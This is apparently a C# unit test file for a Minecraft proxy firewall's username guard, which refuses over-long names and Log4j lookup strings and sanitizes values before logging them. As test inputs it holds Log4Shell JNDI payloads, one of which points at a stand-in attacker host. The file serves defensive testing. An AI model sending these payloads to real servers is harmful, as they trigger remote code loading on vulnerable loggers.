using MinecraftFirewall.Proxy.Defense;
using MinecraftFirewall.Proxy.Inspection;

namespace MinecraftFirewall.Tests;

public class UsernameGuardTests
{
    private static readonly InspectionOptions Options = new();

    [Theory]
    [InlineData("Steve")]
    [InlineData("Notch_Fan99")]
    [InlineData("xX_Dragon_Xx")]
    [InlineData("abc")]
    [InlineData("SixteenCharsXYZ_")]
    // Geyser and Floodgate prefix Bedrock players with a dot. The character set is deliberately not
    // enforced so those setups keep working.
    [InlineData(".BedrockPlayer")]
    public void RealUsernames_AreAccepted(string username) =>
        Assert.Null(UsernameGuard.Check(username, Options));

    [Fact]
    public void AUsernameLongerThanTheProtocolAllows_IsRefused()
    {
        // Found by running an actual attack against the live proxy: a 233-character name carrying a
        // Log4j lookup was accepted and written to the log in full — the exact path Log4Shell took
        // into Minecraft servers. The protocol's own limit is 16, so anything longer is not a
        // Minecraft client at all and refusing it costs nobody anything.
        string username = "${jndi:ldap://attacker.example/a}" + new string('A', 200);

        string? problem = UsernameGuard.Check(username, Options);

        Assert.NotNull(problem);
        Assert.Contains("over the protocol limit", problem!, StringComparison.Ordinal);
    }

    [Fact]
    public void AnInjectionPayloadShortEnoughToFit_IsStillRefused()
    {
        // 16 characters exactly, and still a lookup. The length check alone would have let it past.
        string? problem = UsernameGuard.Check("${jndi:ldap://a}", Options);

        Assert.NotNull(problem);
        Assert.Contains("injection-lookup", problem!, StringComparison.Ordinal);
    }

    [Fact]
    public void AnEmptyUsername_IsRefused() =>
        Assert.NotNull(UsernameGuard.Check("", Options));

    [Fact]
    public void ForLogging_NeverPassesThePayloadToTheFormatterItIsProtecting()
    {
        // The refusal has to be reported, and reporting it with the raw value would hand the payload
        // to exactly the log formatter being defended. Everything outside a safe set becomes '?'.
        string safe = UsernameGuard.ForLogging("${jndi:ldap://attacker.example/a}");

        Assert.DoesNotContain("$", safe, StringComparison.Ordinal);
        Assert.DoesNotContain("{", safe, StringComparison.Ordinal);
        Assert.DoesNotContain("//", safe, StringComparison.Ordinal);
    }

    [Fact]
    public void ForLogging_BoundsItsOwnOutputAndSaysHowMuchItDropped()
    {
        string safe = UsernameGuard.ForLogging(new string('A', 500));

        Assert.True(safe.Length < 64);
        Assert.Contains("500 chars", safe, StringComparison.Ordinal);
    }

    [Fact]
    public void ForLogging_LeavesAnOrdinaryNameReadable() =>
        Assert.Equal("Notch_Fan99", UsernameGuard.ForLogging("Notch_Fan99"));

    [Fact]
    public void WithInjectionScanningOff_TheLengthLimitStillApplies()
    {
        // The two are independent: switching off the heuristic scan must not switch off the check
        // that has no judgement in it.
        var options = new InspectionOptions { ScanForInjectionPayloads = false };

        Assert.Null(UsernameGuard.Check("${jndi:ldap://a}", options));
        Assert.NotNull(UsernameGuard.Check(new string('A', 100), options));
    }
}
